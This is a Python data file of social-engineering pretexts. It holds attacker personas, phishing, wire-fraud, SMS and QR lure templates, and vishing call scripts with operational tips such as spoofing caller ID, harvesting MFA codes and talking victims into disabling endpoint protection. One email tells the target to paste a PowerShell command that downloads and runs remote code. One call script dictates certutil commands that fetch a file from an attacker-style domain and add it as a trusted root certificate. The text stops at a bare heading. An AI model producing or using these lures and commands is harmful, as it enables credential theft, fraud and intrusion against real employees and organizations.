"""
Pretext templates, personas, and scenario data.
All templates use {placeholder} syntax for dynamic generation.
"""

# ═══════════════════════════════════════════════════════════════
#  TARGET INDUSTRIES
# ═══════════════════════════════════════════════════════════════

INDUSTRIES = {
    "tech": {
        "name": "Technology",
        "departments": ["Engineering", "DevOps", "IT", "Security"],
        "software": ["Jira", "GitHub", "Slack", "AWS Console", "Okta"],
        "jargon": ["sprint planning", "CI/CD pipeline", "SSO integration", "incident response"],
        "pain_points": ["production outages", "credential rotation", "on-call fatigue"],
    },

    "finance": {
        "name": "Financial Services",
        "departments": ["Accounting", "Risk Management", "Compliance", "IT", "Trading Floor", "Internal Audit"],
        "software": ["Bloomberg Terminal", "Salesforce", "SAP", "Oracle Financials", "ServiceNow", "Workday", "NetSuite", "Refinitiv Eikon"],
        "jargon": ["fiscal quarter", "regulatory compliance", "audit trail", "risk assessment", "KYC review", "AML compliance", "SOX audit"],
        "pain_points": ["regulatory deadlines", "fraud prevention", "data breaches"],
    },

    "healthcare": {
        "name": "Healthcare",
        "departments": ["Medical Records", "Billing", "IT", "Compliance"],
        "software": ["Epic", "Cerner", "Meditech", "Kronos", "McKesson"],
        "jargon": ["HIPAA compliance", "patient portal", "EHR system", "clinical workflow"],
        "pain_points": ["patient data security", "system downtime", "regulatory audits"],
    },

    "government": {
        "name": "Government",
        "departments": ["Security", "IT", "Compliance", "Operations"],
        "software": ["Splunk", "Tenable", "Archer", "Salesforce Gov Cloud", "Microsoft 365 GCC", "ServiceNow"],
        "jargon": ["classified information", "security clearance", "FISMA compliance", "NIST standards", "POAM remediation", "authority to operate"],
        "pain_points": ["data classification", "access control issues", "compliance audits"],
    },

    "education": {
        "name": "Education",
        "departments": ["IT", "Admissions", "Financial Aid", "Student Services"],
        "software": ["Blackboard", "Canvas", "Banner", "Zoom", "Google Workspace"],
        "jargon": ["course management", "student information system", "virtual learning environment", "admissions cycle"],
        "pain_points": ["phishing attacks on students", "credential theft", "system outages during enrollment"],
    },

    "manufacturing": {
        "name": "Manufacturing",
        "departments": ["Operations", "IT", "Supply Chain", "Quality Control"],
        "software": ["Siemens S7", "Rockwell", "SAP", "Oracle SCM", "Wonderware"],
        "jargon": ["production line", "supply chain disruption", "quality assurance", "inventory turnover", "SCADA system", "PLC firmware"],
        "pain_points": ["production downtime", "supply chain attacks", "intellectual property theft"],
    },

    "retail": {
        "name": "Retail",
        "departments": ["Sales", "IT", "Customer Service", "Logistics"],
        "software": ["Shopify", "Square", "Salesforce Commerce", "Oracle Retail", "Magento", "Lightspeed"],
        "jargon": ["point of sale", "customer relationship management", "supply chain logistics", "inventory turnover", "PCI DSS compliance"],
        "pain_points": ["payment card breaches", "credential theft from employees", "supply chain disruptions"],
    },
}

# ═══════════════════════════════════════════════════════════════
#  ATTACKER PERSONAS
# ═══════════════════════════════════════════════════════════════

PERSONAS = {
    "it_support": {
        "name": "IT Support Technician",
        "titles": ["IT Support Specialist", "Help Desk Analyst", "Systems Administrator", "Desktop Support Engineer"],
        "pretexts": [
            "your password expires in 2 hours - reset now through this portal to avoid account lockout",
            "deploying a critical {software} security patch - need you to run the attached installer or grant remote access",
            "your account was flagged for suspicious login activity - verify your identity to prevent suspension",
            "scheduled MFA enrollment for your department - complete registration before end of day or access will be restricted",
            "VPN configuration update required - download the new profile from this link before remote access is revoked",
            "your workstation failed our latest security scan - need remote access to remediate before the next audit cycle",
        ],
    },

    "vendor": {
        "name": "Third-Party Vendor",
        "titles": ["Technical Account Manager", "Customer Success Engineer", "Integration Specialist"],
        "pretexts": [
            "your {software} license expires in 48 hours - confirm renewal immediately",
            "critical vulnerability discovered in {software} - need to backup and reset your workspace",
            "your {software} integration is causing system conflicts - need you to transfer your work so we can resolve",
            "urgent security patch for {software} - requires your authorization to deploy",
            "your {software} environment failed our compliance scan - need remote access to remediate",
        ],
    },

    "executive": {
        "name": "Executive / C-Suite Impersonation",
        "titles": ["CEO", "CFO", "CTO", "COO", "VP of Operations"],
        "pretexts": [
            "send me the quarterly security report before my meeting - need it within the hour",
            "handle the attached transfer instructions quietly - we can't afford an information leak",
            "I've already spoken with {name} about this - I need you to process it immediately",
            "confidential acquisition due diligence - need financials before close of business",
            "vendor payment authorization - wire before 3PM today, details attached",
        ],
    },

    "auditor": {
        "name": "External Auditor",
        "titles": ["Audit Manager", "Compliance Auditor", "Risk Assessment Specialist", "Security Assessor"],
        "pretexts": [
            "conducting a GDPR compliance audit - need stored user data records and sample PII logs by midnight or the company faces legal proceedings for non-compliance",
            "sent by ATOS to review access logs and verify privileged account activity - failure to provide by tomorrow morning will be flagged as an audit exception and escalated to the board",
            "conducting a payroll compliance audit - need all relevant spreadsheets from this quarter by tomorrow afternoon or this triggers an on-site inspection by your tax authority",
            "annual security audit - need current firewall configurations and admin access lists within 24 hours",
            "third-party risk assessment follow-up - your vendor compliance documentation is overdue and blocking certification renewal",
        ],
    },

    "new_employee": {
        "name": "New Employee",
        "titles": ["New Hire", "Recent Transfer", "Contractor (First Day)", "Intern"],
        "pretexts": [
            "new hire from the Network branch - need you to run the attached speed test to evaluate on-site performance",
            "my badge won't let me into the server room - my manager {name} told me to change the RJ45 cables after hours",
            "my account is under activation - can you forward the network infrastructure layout so I can start working off hours",
            "my manager {name} said to ask you for temporary access - IT hasn't set up my account yet",
            "first day and I can't access {software} - need temporary credentials for the onboarding training at 2PM",
        ],
    },

    "physical": {
        "name": "Physical Intruder",
        "titles": ["HVAC Technician", "Delivery Driver", "Maintenance Worker", "Telecom Technician", "Fire Safety Inspector"],
        "pretexts": [
            "here to take footage of the assembly room to prepare Q4 renovations",
            "delivering a Smart Printer for HR - manager requested direct delivery to the office",
            "maintenance on core power supplies - faulty cables reported by the site administrator who requested me on-site",
            "scheduled network cable installation per work order #{wo_number} - building management approved access",
            "fire suppression system annual certification - need access to all floors including server room",
        ],
    },
}

# ═══════════════════════════════════════════════════════════════
#  URGENCY TRIGGERS
# ═══════════════════════════════════════════════════════════════

URGENCY_TRIGGERS = {
    "low": [
        "When you get a chance",
        "Please review at your convenience",
        "Feel free to take a look when you have time",
        "No rush, but please review when convenient",
    ],
    "medium": [
        "By end of day today",
        "Please complete by tomorrow",
        "This needs to be addressed before the weekend",
        "Please prioritize this task",
    ],
    "high": [
        "This needs to happen in the next 30 minutes",
        "This requires immediate attention",
        "Please address this within the hour",
        "Important task - please act now",
    ],
    "critical": [
        "A breach is currently occurring and your account has not been compromised yet",
        "Per emergency board resolution - all managers must re-verify credentials before midnight",
        "To comply with SEC inquiry, review and submit this quarter's reports immediately",
        "Review and send the contracts signed during Q2 first week - a flaw has been detected and clients are threatening legal action",
    ],
}

# ═══════════════════════════════════════════════════════════════
#  SEASONAL HOOKS
# ═══════════════════════════════════════════════════════════════

SEASONAL_HOOKS = {
    "q1": [
        "Annual security training enrollment",
        "Tax season document submission - W2/1099 verification",
        "Annual password reset policy enforcement",
        "Q1 financial reporting deadline approaching",
    ],
    "q2": [
        "Mid-year compliance review",
        "Summer intern onboarding batch - IT access requests",
        "Quarterly software license renewal notices",
        "Password reset policy follow-up for accounts created in Q1",
    ],
    "q3": [
        "Pre-audit preparation",
        "Hurricane/disaster recovery drill",
        "Vendor contract renewal discussions for expiring agreements",
        "Q3 performance review cycle - manager approvals",
    ],
    "q4": [
        "Holiday schedule - urgent before office closure",
        "Year-end compliance deadline - final submissions",
        "End-of-year financial reporting",
        "Holiday security awareness training",
    ],
}

# ═══════════════════════════════════════════════════════════════
#  PHISHING EMAIL TEMPLATES
# ═══════════════════════════════════════════════════════════════

PHISHING_TEMPLATES = [
    {
        "id": "credential_harvest",
        "name": "Credential Harvesting",
        "subject_lines": [
            "Action Required: Verify Your {software} Account",
            "Security Alert: Unusual Activity Detected on Your {software} Account",
            "Immediate Action Required: Confirm Your {software} Account Details",
            "{software} Account Suspension Warning - Verify Now",
        ],
        "body": """Hi {first_name},

{urgency_opening}

Please verify your identity by clicking the link below:

{phishing_link}

If you do not complete this within {deadline}, your access to {software} will be temporarily suspended.

{signature}""",
    },
    {
        "id": "malicious_attachment",
        "name": "Malicious Attachment",
        "subject_lines": [
            "Important: {document_name} - Review Required",
            "{department} Update: Please Review Attached Document",
            "Confidential: {document_name} - For Your Eyes Only",
            "Action Required: Review and Sign {document_name}",
        ],
        "body": """Hi {first_name},

{urgency_opening}

Please find the attached {document_type} that requires your immediate review. This document has been approved by {department} leadership and is being distributed to all relevant personnel.

📎 {attachment_note}

Please review, sign, and return by {deadline}. If you have trouble opening the file, please enable macros when prompted — this is required by our document security policy.

{signature}""",
    },
    {
        "id": "bec_wire",
        "name": "Business Email Compromise (Wire Fraud)",
        "subject_lines": [
            "Confidential - Urgent Payment Required",
            "Re: Vendor Payment - Updated Banking Details",
            "Quick Favor - Need This Handled Discreetly",
            "{executive_name} - Urgent Wire Transfer Request",
        ],
        "body": """Hi {first_name},

I need you to handle something urgently and discreetly. We are finalizing a confidential deal and I need a wire transfer processed before close of business.

Please send the following:

    Amount: ${amount}
    Bank: {bank_name}
    Account: {account_placeholder}
    Reference: {reference}

This needs to be completed by {deadline}. Do not discuss this with anyone else until the deal is finalized — we can't afford an information leak.

I've already cleared this with legal. Confirm once done.

{executive_signature}""",
    },
    {
        "id": "callback_phishing",
        "name": "Callback Phishing (Vishing Setup)",
        "subject_lines": [
            "Subscription Renewal - Charge of ${amount} Processed",
            "Order Confirmation #{invoice_number}",
            "Your Account Has Been Charged ${amount}",
            "Receipt for Recent Purchase - {software} Enterprise License",
        ],
        "body": """Dear {first_name},

This email confirms your recent purchase:

    Transaction ID: {transaction_id}
    Date: {date}
    Description: {software} Enterprise License - Annual Renewal
    Amount: ${amount}

If you authorized this transaction, no action is needed.

If you DID NOT authorize this charge, contact our support team immediately to request a full refund:

    Phone: {callback_number}
    Available 24/7 - Reference your Transaction ID when calling

Please note: refund requests must be submitted within 48 hours of the charge.

{generic_signature}""",
    },
    {
        "id": "supply_chain",
        "name": "Supply Chain Vendor Compromise",
        "subject_lines": [
            "Urgent: {software} Security Patch Available - Install Before {deadline}",
            "[{software}] Critical Update Required - Action Needed",
            "Mandatory: {software} Vendor Security Update - Ref: {reference}",
            "{software} Integration Update - Requires Your Authorization",
        ],
        "body": """Hi {first_name},

We're reaching out to notify you of a critical security update for {software} that requires immediate action from all authorized users.

As part of our ongoing partnership with {company}, we've identified a vulnerability in the current deployment that must be patched before {deadline}.

Please download and install the update using the secure link below:

{phishing_link}

This update has been reviewed and approved by your IT department. If you experience any issues during installation, contact your {software} account representative.

{signature}""",
    },
    {
        "id": "credential_breach",
        "name": "Credential Breach Notification",
        "subject_lines": [
            "SECURITY ALERT: Your {company} Credentials Found in Data Breach",
            "Action Required: Password Reset Due to Third-Party Breach",
            "Urgent: Your {software} Account May Be Compromised",
            "[Security Team] Mandatory Password Reset - Breach Detected",
        ],
        "body": """Dear {first_name},

Our security monitoring has detected that credentials associated with your {company} account were found in a third-party data breach. This is NOT a breach of {company} systems, but your credentials may have been exposed through a compromised external service.

To protect your account, you must reset your password immediately:

{phishing_link}

If you do not reset your password by {deadline}, your account will be temporarily locked as a precautionary measure.

For reference, the compromised data was identified on {date} and includes email addresses and hashed passwords. We strongly recommend enabling multi-factor authentication after resetting your password.

{signature}""",
    },
    {
        "id": "password_policy_change",
        "name": "Password Policy Compliance Change",
        "subject_lines": [
            "ACTION REQUIRED: New password policy takes effect {deadline}",
            "[{company} IT Security] Mandatory password reset — New complexity requirements",
            "Your {software} password does not meet updated security requirements",
            "Password Policy Update — Immediate action required for {department}",
        ],
        "body": """Dear {first_name},

As part of our ongoing security hardening initiative, {company} is implementing enhanced password requirements effective {deadline}. Our records indicate that your current password does not meet the new complexity standards.

New requirements:
  - Minimum 16 characters (increased from 8)
  - Must include uppercase, lowercase, numbers, and special characters
  - Cannot reuse any of your last 24 passwords
  - Must be changed within the next {deadline}

Please update your password immediately through our secure portal:

{phishing_link}

Accounts that do not comply by {deadline} will be automatically locked pending manual review by IT Security. This process can take 3-5 business days.

If you have questions, contact the IT Security team at x4500.

{signature}""",
    },
    {
        "id": "sso_migration",
        "name": "SSO Provider Migration",
        "subject_lines": [
            "[IT Migration] {software} SSO cutover — Re-authentication required by {deadline}",
            "IMPORTANT: {company} identity provider migration — Action needed",
            "Your {software} session will expire during SSO migration — Re-authenticate now",
            "[{company} IT] Single Sign-On migration — Verify your identity",
        ],
        "body": """Hello {first_name},

{company} is migrating to an upgraded Single Sign-On (SSO) identity provider to improve security and performance. As part of this migration, all {department} employees must re-authenticate their accounts before the cutover on {deadline}.

What you need to do:
  1. Click the secure verification link below
  2. Sign in with your current {software} credentials
  3. Confirm your identity via your existing MFA method
  4. Your account will be automatically migrated to the new provider

Verify your identity now:

{phishing_link}

IMPORTANT: If you do not complete this verification before {deadline}, your access to {software} and all SSO-connected applications will be interrupted until IT can manually re-provision your account.

The migration has been approved by {executive_name} and the IT Security team. For questions, contact the migration helpdesk at sso-support@{company}.com.

{signature}""",
    },
    {
        "id": "macro_document",
        "name": "Macro-Enabled Document Delivery",
        "subject_lines": [
            "[{department}] {document_name} — Enable editing to view",
            "CONFIDENTIAL: {document_type} for {first_name} — Protected content",
            "Re: {document_name} — Please enable macros to decrypt",
            "[{company}] Encrypted {document_type} — Follow instructions to view",
        ],
        "body": """Hi {first_name},

Please find attached the {document_type} you requested: {document_name}

This document is protected with enterprise-grade encryption for confidentiality. To view the contents, you will need to:

  1. Open the attached file
  2. Click "Enable Editing" if prompted by the yellow security bar
  3. Click "Enable Content" to activate the decryption macro
  4. The document will automatically decrypt and display

NOTE: The decryption macro is signed by our IT Security team and is safe to enable. If your {software} security settings block the macro, please follow the instructions in the security bar or contact IT at x4500.

This document contains sensitive information intended only for {first_name} in {department}. Do not forward.

{signature}""",
    },
    {
        "id": "powershell_diagnostic",
        "name": "IT Diagnostic Script Execution",
        "subject_lines": [
            "[IT Support] Ticket #{reference} — Run diagnostic script to resolve your issue",
            "[{company} IT] System health check required for {department} workstations",
            "Re: Your IT ticket — Paste this command to fix the {software} connectivity issue",
            "[Automated] {software} performance degradation detected — Diagnostic required",
        ],
        "body": """Hello {first_name},

Following up on the reported {software} performance issues affecting {department}, our engineering team has prepared a diagnostic script that will collect system telemetry and resolve the configuration drift.

Please run the following command in PowerShell (Run as Administrator):

  powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('{phishing_link}')"

Steps:
  1. Press Windows + X, select "Windows PowerShell (Admin)"
  2. Copy and paste the command above
  3. Press Enter and wait for the diagnostic to complete (~2 minutes)
  4. A summary report will be saved to your Desktop

This script has been reviewed by IT Security (ticket {reference}) and is safe to execute. It collects:
  - Network configuration and DNS settings
  - {software} connection logs
  - System performance counters

If you encounter any UAC prompts, click "Yes" to allow the diagnostic to run with the necessary permissions.

{signature}""",
    },
]

# ═══════════════════════════════════════════════════════════════
#  SMISHING (SMS PHISHING) TEMPLATES
# ═══════════════════════════════════════════════════════════════

SMISHING_TEMPLATES = [
    {
        "id": "account_verify",
        "name": "Account Verification",
        "messages": [
            "[{company}] Your account has been locked due to suspicious activity. Verify now to restore access: {smishing_link}",
            "[{company}] ALERT: Unusual sign-in detected on your {software} account. Confirm your identity: {smishing_link}",
            "[{company}] Your account credentials expire today. Update immediately to avoid disruption: {smishing_link}",
        ],
    },
    {
        "id": "package_delivery",
        "name": "Package Delivery",
        "messages": [
            "[{carrier}] Your package could not be delivered. Reschedule delivery: {smishing_link}",
            "[{carrier}] Delivery attempted - address confirmation needed. Update here: {smishing_link}",
            "[{carrier}] Package #{tracking_id} is held at facility. Pay ${small_fee} customs fee to release: {smishing_link}",
        ],
    },
    {
        "id": "mfa_code",
        "name": "MFA / Verification Code",
        "messages": [
            "Your {software} verification code is {mfa_code}. If you didn't request this, secure your account: {smishing_link}",
            "[{company}] Security code: {mfa_code}. If this wasn't you, report unauthorized access: {smishing_link}",
            "{software} login attempt detected. Your one-time code is {mfa_code}. Not you? Act now: {smishing_link}",
        ],
    },
    {
        "id": "payment_alert",
        "name": "Payment / Banking Alert",
        "messages": [
            "[{bank_name}] A payment of ${amount} was charged to your account. If unauthorized, dispute: {smishing_link}",
            "[{bank_name}] FRAUD ALERT: ${amount} pending transaction. Approve or decline: {smishing_link}",
            "[{company}] Your direct deposit of ${amount} failed. Update banking info: {smishing_link}",
        ],
    },
]

# ═══════════════════════════════════════════════════════════════
#  QUISHING (QR CODE PHISHING) TEMPLATES
# ═══════════════════════════════════════════════════════════════

QUISHING_TEMPLATES = [
    {
        "id": "wifi_portal",
        "name": "Guest Wi-Fi Portal",
        "pretext_text": "GUEST WI-FI ACCESS\n\nScan the QR code below to connect to {company} Guest Network.\nA valid company email is required for authentication.\n\nNetwork: {company}-Guest\nSupport: {support_email}",
        "delivery_methods": ["Laminated poster in lobby", "Tent card on conference table", "Sticker near reception desk", "Digital signage in waiting area"],
        "placement_suggestions": ["Lobby and reception areas", "Conference rooms", "Visitor waiting areas", "Co-working spaces", "Cafeteria and break rooms"],
        "objectives": [
            "Harvest corporate email credentials via fake captive portal",
            "Capture MFA tokens through real-time phishing proxy",
            "Collect device information from connecting clients",
            "Establish man-in-the-middle position on victim traffic",
        ],
    },
    {
        "id": "parking_payment",
        "name": "Parking Payment Kiosk",
        "pretext_text": "PARKING PAYMENT\n\nScan to pay for parking — contactless and fast.\nAccepted: Visa, Mastercard, Apple Pay\n\nZone: {parking_zone}\nRate: ${parking_rate}/hr\nLot: {company} {department} Building",
        "delivery_methods": ["Sticker placed over legitimate QR on parking meter", "Flyer on car windshields in parking garage", "Posted sign near parking garage entrance", "Printed card left on parking payment kiosk"],
        "placement_suggestions": ["Company parking garage", "Visitor parking lot", "Street parking meters near target building", "Employee parking structure"],
        "objectives": [
            "Harvest payment card details via fake payment page",
            "Collect personal information (name, email, phone)",
            "Link payment info to employee identities for targeted follow-up",
            "Test physical security awareness of employees in parking areas",
        ],
    },
    {
        "id": "document_access",
        "name": "Shared Document Access",
        "pretext_text": "CONFIDENTIAL — {department} ONLY\n\nScan to access: {document_name}\nShared by: {sender_name}, {sender_title}\n\nThis document requires {software} authentication.\nLink expires: {deadline}",
        "delivery_methods": ["Printed memo left on desks or in mailboxes", "Embedded in a phishing email as an image", "Posted on internal bulletin board", "Included in a printed meeting agenda"],
        "placement_suggestions": ["Department printer trays", "Shared mailboxes and cubbies", "Conference room tables before meetings", "Posted on team bulletin boards", "Left in break room"],
        "objectives": [
            "Harvest SSO/corporate credentials via fake login page",
            "Deliver malware through fake document download",
            "Capture session tokens through phishing proxy",
            "Test employee response to physical social engineering artifacts",
        ],
    },
    {
        "id": "employee_verify",
        "name": "Employee Badge Verification",
        "pretext_text": "NOTICE: MANDATORY BADGE VERIFICATION\n\nAll {department} employees must verify their badge is active.\nScan the QR code below and log in with your {software} credentials.\n\nDeadline: {deadline}\nNon-compliance will result in temporary access suspension.\n\nIT Security — {company}",
        "delivery_methods": ["Posted near badge readers and building entrances", "Printed flyer in elevator or stairwell", "Notice posted in break room", "Handed out by physical social engineer posing as security"],
        "placement_suggestions": ["Building entrance near badge reader", "Elevator lobbies on each floor", "Break rooms and kitchens", "HR bulletin board", "Near restricted access doors"],
        "objectives": [
            "Harvest employee credentials through urgency and authority",
            "Map badge reader locations and employee access patterns",
            "Test compliance with unverified security notices",
            "Collect employee names and department info from form submissions",
        ],
    },
]

# ═══════════════════════════════════════════════════════════════
#  VISHING SCRIPTS
# ═══════════════════════════════════════════════════════════════

VISHING_SCRIPTS = [
    {
        "id": "it_support_call",
        "name": "IT Support Call",
        "opening": """[CALLER]: Hi, this is {caller_name} from {company} IT Support.
I'm reaching out because we've detected {issue} on your workstation.
Is this {target_name} from {department}?""",
        "escalation": """[CALLER]: I completely understand your concern - we've been getting a lot of calls about this today.
Let me pull up your ticket... Yes, I can see ticket #{ticket_number} was created at {time} today.
{manager_name} from your department approved this maintenance window.
I just need to verify a few things on your end to get this resolved quickly.
Would you prefer I call back on your desk phone, or can we handle this now?""",
        "objective": """GOAL: Get target to:
  - Confirm their username and employee ID
  - Navigate to a URL for "remote support session"
  - Read back a verification code (intercepted MFA token)
  - Disable endpoint protection temporarily for "patching"
  - Run a diagnostic tool (payload) sent via email""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't ask for passwords directly - ask them to "reset through our portal"
  ✗ Don't rush - real IT support is patient and methodical
  ✗ Don't get defensive if questioned - offer to let them verify via callback
  ✗ Don't use technical jargon the target wouldn't understand
  ✓ Use the target's real department and manager names (from OSINT)
  ✓ Reference real software they use
  ✓ Have a spoofed caller ID matching company IT department
  ✓ Offer a callback number that routes to your infrastructure""",
    },
    {
        "id": "vendor_support_call",
        "name": "Vendor Support Call",
        "opening": """[CALLER]: Good {time_of_day}, this is {caller_name} from {vendor_name} support.
I'm calling about a critical security advisory affecting your {software} deployment.
Can I speak with whoever manages your {software} environment?""",
        "escalation": """[CALLER]: I understand you need to verify this. Absolutely - security is why I'm calling.
We've identified a vulnerability - CVE-{cve_year}-{cve_id} - that affects your version.
I've been assigned to help priority customers patch before the public disclosure on {disclosure_date}.
I can send you the official advisory email right now if you'd like to verify.
In the meantime, can you confirm what version you're currently running so I can check if you're affected?""",
        "objective": """GOAL: Get target to:
  - Confirm software version and deployment details
  - Grant remote access for "emergency patching"
  - Run a "verification tool" sent via email (payload)
  - Provide admin credentials for "patch deployment"
  - Disable security controls that would block the "update" """,
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't use fake CVE numbers - research real recent ones for the software
  ✗ Don't pressure for immediate admin access - build up to it
  ✗ Don't claim to know their setup if you haven't done OSINT
  ✓ Reference their actual software version (from job postings, Shodan, Wappalyzer)
  ✓ Offer to send a verification email (from your spoofed domain)
  ✓ Be prepared to explain the vulnerability technically
  ✓ Know the vendor's real support processes so you can mimic them""",
    },
    {
        "id": "executive_impersonation_call",
        "name": "Executive Impersonation Call",
        "opening": """[CALLER]: {target_name}? This is {executive_name}.
I'm between meetings right now but I need you to handle something for me quickly.
Can you talk for a minute?""",
        "escalation": """[CALLER]: Listen, I can't go into all the details right now because
this is confidential. We're closing a deal and I need {action} processed
before {deadline}. I've already spoken with {department_head} about it.
I'm going to send you the details by email right after this call.
Can you take care of this as soon as you get it? I'm counting on you.""",
        "objective": """GOAL: Get target to:
  - Process a wire transfer or payment
  - Share sensitive financial documents
  - Bypass normal approval workflows based on perceived authority
  - Forward credentials or grant system access
  - Open an attachment sent in follow-up email (payload delivery)""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't attempt without studying the executive's speech patterns (YouTube, podcasts, earnings calls)
  ✗ Don't ask for things outside the target's actual authority
  ✗ Don't be aggressive - real executives delegate, they don't threaten subordinates
  ✗ Don't call from an unknown number - spoof the executive's real number or office line
  ✓ Research the executive's schedule and reference real events
  ✓ Reference real ongoing projects (from LinkedIn, press releases, SEC filings)
  ✓ Keep it short - executives don't have long phone conversations
  ✓ Create follow-up via email for payload delivery after establishing trust by phone""",
    },
    {
        "id": "password_reset_escalation",
        "name": "Password Reset / Privilege Escalation",
        "opening": """[CALLER]: Hi, this is {caller_name} from {company} Identity and Access Management.
I'm calling because we've flagged your account for a required privilege review.
Is this {target_name} in {department}?""",
        "escalation": """[CALLER]: Great. So here's what's happening — during our quarterly access review,
we found that your account has elevated privileges that need to be re-certified.
I have your ticket right here — #{ticket_number}, opened by {manager_name}.
To complete the re-certification, I need you to verify your current access level
and then we'll walk through the reset process together.
Can you confirm your current role and the admin groups you belong to?""",
        "objective": """GOAL: Get target to:
  - Reveal their access level and admin group memberships
  - Navigate to a fake IAM portal for "re-certification"
  - Enter current credentials to "verify before reset"
  - Approve a fake MFA prompt (push notification attack)
  - Reveal service account credentials they manage""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't claim their account is compromised - say it's a routine review
  ✗ Don't ask for passwords directly - use "re-certification portal"
  ✗ Don't rush the process - IAM teams are methodical
  ✗ Don't call without knowing their actual admin tools
  ✓ Know their actual admin group names (from OSINT, LinkedIn, job postings)
  ✓ Reference real IAM tools the company uses (Azure AD, Okta, CyberArk)
  ✓ Have a spoofed caller ID matching the IAM/Identity team extension
  ✓ Be prepared to explain the re-certification process in detail""",
    },
    {
        "id": "service_account_audit",
        "name": "Service Account Security Audit",
        "opening": """[CALLER]: Good {time_of_day}, this is {caller_name} from {company} Security Operations.
I'm reaching out regarding the service account audit mandated by compliance.
I need to speak with whoever manages the {software} service accounts in {department}.""",
        "escalation": """[CALLER]: Right, so as part of our SOC2/ISO 27001 compliance requirements,
we're auditing all service accounts across the organization.
{manager_name} from {department} was notified about this two weeks ago.
I need to verify the service accounts tied to your {software} deployment —
specifically the account names, rotation schedule, and who has access.
Can you pull that up for me? I'll also need you to verify the current credentials
are valid by testing them through our audit portal.""",
        "objective": """GOAL: Get target to:
  - Disclose service account names and configurations
  - Reveal password rotation schedule and last change date
  - Test credentials through attacker-controlled "audit portal"
  - Share API keys or tokens used by service accounts
  - Grant temporary access to service account management console""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't claim to be from an external audit firm without preparation
  ✗ Don't ask for all service accounts at once - start with one system
  ✗ Don't use compliance jargon you can't explain if questioned
  ✗ Don't skip the reference to a manager who approved the audit
  ✓ Research actual compliance frameworks the company follows
  ✓ Know service account naming conventions (from error messages, job postings)
  ✓ Reference real audit deadlines (SOC2 Type II is annual)
  ✓ Offer to send the audit request via official-looking email as verification""",
    },
    {
        "id": "kerberoast_audit",
        "name": "Service Principal Name Audit",
        "opening": """[CALLER]: Good {time_of_day}, this is {caller_name} from the Identity Security team at {company}.
I'm reaching out regarding a mandatory audit of Service Principal Names in Active Directory.
Our security scan flagged service accounts associated with {department} — are you the person
who manages the {software} service accounts?""",
        "escalation": """[CALLER]: Thanks for confirming. Here's what's happening — our quarterly Kerberos
security assessment found that several SPNs registered to your {software} deployment
are configured with weak encryption types. Ticket {ticket_number} was opened by {manager_name}.
I need to verify which service accounts are linked to your {software} instance,
confirm the SPN configuration, and then we'll rotate the credentials through our
secure portal. Can you pull up your service account list? I'll also need you to
test the current credentials on our audit portal to confirm they're still valid
before we initiate the rotation.""",
        "objective": """OBJECTIVE: Get the target to:
  - Disclose service account names and SPN configurations
  - Reveal service account passwords or encryption keys
  - Test credentials on attacker-controlled 'audit portal' (harvest Kerberos tickets)
  - Share the keytab file or service account configuration
  - Grant temporary access to AD service account management""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't use Kerberos jargon you can't explain if questioned
  ✗ Don't ask for Domain Admin credentials — focus on service accounts only
  ✗ Don't rush — identity security audits are methodical
  ✗ Don't call without knowing the target's AD management tools
  ✓ Know real SPN syntax (MSSQLSvc/server.domain.com:1433)
  ✓ Reference actual AD tools the org uses (Azure AD Connect, ADUC, PowerShell AD module)
  ✓ Have a fake audit portal ready that mimics legitimate SSO
  ✓ Understand Kerberos encryption types (RC4, AES128, AES256) to discuss remediation""",
    },
    {
        "id": "endpoint_override",
        "name": "Endpoint Protection Override Request",
        "opening": """[CALLER]: Hi {target_name}, this is {caller_name} from the {company} SOC.
We're seeing an issue where the latest {software} endpoint protection update is
conflicting with a critical system patch being deployed today. I need your help
to temporarily adjust your endpoint settings so the patch can install correctly.""",
        "escalation": """[CALLER]: Here's the situation — Microsoft released an emergency out-of-band
security patch last night for a zero-day (CVE-{cve_year}-{cve_id}). Our {software}
endpoint agent is flagging the patch installer as a false positive, which means
the patch can't install while real-time protection is active.
{manager_name} approved a 15-minute maintenance window for {department} workstations.
I'll walk you through exactly what to do — first, I need you to open your {software}
settings panel and navigate to Real-Time Protection. You'll need to toggle it off
for about 15 minutes while the patch deploys. I'll tell you exactly when to re-enable it.""",
        "objective": """OBJECTIVE: Get the target to:
  - Disable endpoint protection / real-time scanning
  - Add exclusion folders or processes to the security agent
  - Run a 'patch installer' that is actually a payload
  - Disable Windows Defender or other built-in protections
  - Approve an administrative elevation prompt for 'the patch'""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
  ✗ Don't ask them to uninstall the endpoint agent — just disable temporarily
  ✗ Don't claim you can do it remotely — if you could, you wouldn't need to call
  ✗ Don't keep protection disabled for too long — specify a realistic 15-min window
  ✗ Don't call without knowing which endpoint product they actually use
  ✓ Reference a real recent CVE that would justify emergency patching
  ✓ Know the exact UI steps for the target's endpoint protection product
  ✓ Offer to stay on the phone and 'verify the patch installed correctly'
  ✓ Send a follow-up email with the 'patch' download link for payload delivery""",
    },
    {
        "id": "lolbin_diagnostic",
        "name": "LOLBin Diagnostic Procedure",
        "opening": """[CALLER]: {time_of_day}, this is {caller_name} from IT Infrastructure at {company}.
I'm working on ticket {ticket_number} regarding certificate validation issues affecting
{software} in {department}. I need to walk you through a quick diagnostic procedure
to check your certificate store. Is this {target_name}?""",
        "escalation": """[CALLER]: Great. So the issue is that some workstations in {department} are failing
to validate TLS certificates, which is causing {software} connection timeouts.
{manager_name} reported this yesterday. What I need you to do is open a Command Prompt
and run a couple of commands to check your certificate store.

First, let's verify your certificates:
  certutil -urlcache -split -f https://certificates-{company}.verify-update.com/cert.cer cert.cer

This downloads our updated root certificate. Then run:
  certutil -addstore -f Root cert.cer

That installs it in your trusted root store. This will fix the {software} certificate
validation chain. It should only take a minute.""",
        "objective": """OBJECTIVE: Get the target to:
  - Run certutil (a legitimate Windows binary) to download a malicious payload
  - Execute downloaded files that appear to be certificates but contain code
  - Add an attacker-controlled certificate to the trusted root store
  - Run additional LOLBin commands (bitsadmin, mshta, rundll32) for further access
  - Provide administrative credentials if UAC prompts appear""",
        "red_flags_to_avoid": """MAINTAIN CREDIBILITY:
